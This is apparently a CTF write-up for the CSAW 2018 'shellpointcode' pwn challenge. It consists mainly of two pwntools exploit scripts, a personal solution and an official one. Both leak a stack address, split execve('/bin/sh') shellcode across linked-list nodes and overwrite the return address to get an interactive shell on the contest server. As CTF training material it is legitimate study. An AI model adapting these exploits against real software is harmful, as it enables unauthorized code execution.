# shellpointcode

> Linked lists are great!
> They let you chain pieces of data together.
> 
> (give shellpointcode*)
> (give shellpointcode.c

## solution

个人题解

```python
#!/usr/bin/env python2
# coding: utf-8

from pwn import *
import itertools

IP = "pwn.chal.csaw.io"
PORT = 9005
# IP = "127.0.0.1"
# PORT = 9999

context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
mode = args['MODE'].lower()
binary = "./shellpointcode"


# for i in range(0xb8, 0x500, 8):
def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


if mode == "remote":
    context.noptrace = True
    io = remote(IP, PORT)
    # libc = ELF("./libc.so.6")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    binary = ELF("./shellpointcode")
    one_gg = 0x4f322
    padding = 0
    i = 0x158
else:
    io = process(binary)
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/CSAW18/pwn/shellpointcode/shellpointcode"]
    libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    binary = ELF("./shellpointcode")
    one_gg = 0xf02a4
    padding = 0x10
    i = 0x210

io.recvline()

# gdb.attach(io, '''
# b *0x{:x}
# c
# '''.format(
#     # proc_base+0x0000000000000954,  # print node 
#     proc_base+0x00000000000008CF,  # gets
#     # proc_base+0x0000000000000889,  # gets
#     )
# )

shellcode0 = "\x90"*0x10+ asm("xor rax, rax") + asm(shellcraft.amd64.sh())

rud("(15 bytes) Text for node 1:")
sel(shellcode0)
rud("(15 bytes) Text for node 2:")
sel(shellcode0)
rud("node.next: ")
data = io.readline().strip()
leaked_stack = int(data, base=16)
print "[+] leaked stack: ", hex(leaked_stack)

rud("What are your initials?")

shellcode1 = """mov rax, 0x{:x}
jmp [rax]""".format(leaked_stack - i)
# jmp [rax]""".format(leaked_stack-0x210)

payload = "A"*3 + "B"*8 + p64(leaked_stack) + asm(shellcode1)
sel(payload)

io.interactive()

```

官方题解：

```py
#!/usr/bin/python
from pwn import *
import struct

#context.log_level = 'debug'
context.terminal="/bin/zsh"

# shellcode = """xor eax, eax
# mov rbx, 0xFF978CD091969DD1
# neg rbx
# push rbx
# push rsp
# pop rdi
# cdq
# push rdx
# push rdi
# push rsp
# pop rsi
# mov al, 0x3b
# syscall""".split('\n')

shellcode = """mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
xor eax, eax
cdq
xor esi, esi
push rsp
pop rdi
mov al, 0x3b
syscall""".split('\n')


def asm64(cmd):
    return asm(cmd, arch = 'amd64', os = 'linux')


def jmp(n):
    return '\xeb' + struct.pack('<I', 211 - 2)


def split_code():
    l = 15 - 4
    b = ''
    nodes = []
    for i in shellcode:
        b += asm64(i)
        if len(b) >= l:
            b += jmp(16 + (l - len(b)))
            nodes.append(b)
            b = ''
    return nodes



if True:
    conn = remote('pwn.chal.csaw.io', 9005)
    #conn = process('./shellpointcode')
    #pause()
    # gdb.attach(conn)

    h2, h1 = split_code()
    
    print conn.recvuntil(': '), h2
    conn.sendline(h2)
    
    print conn.recvuntil(': '), h1
    conn.sendline(h1)
    
    print conn.recvuntil('next: ')
    a = conn.recvline().strip()
    print a
    
    adj = int(a, 16) + 40
    addr = struct.pack('<Q', adj)
    print 'addr', hex(adj), len(addr)
    
    print conn.recvuntil('?'), addr
    conn.sendline('A' * 11 + addr)
    
    conn.interactive()
```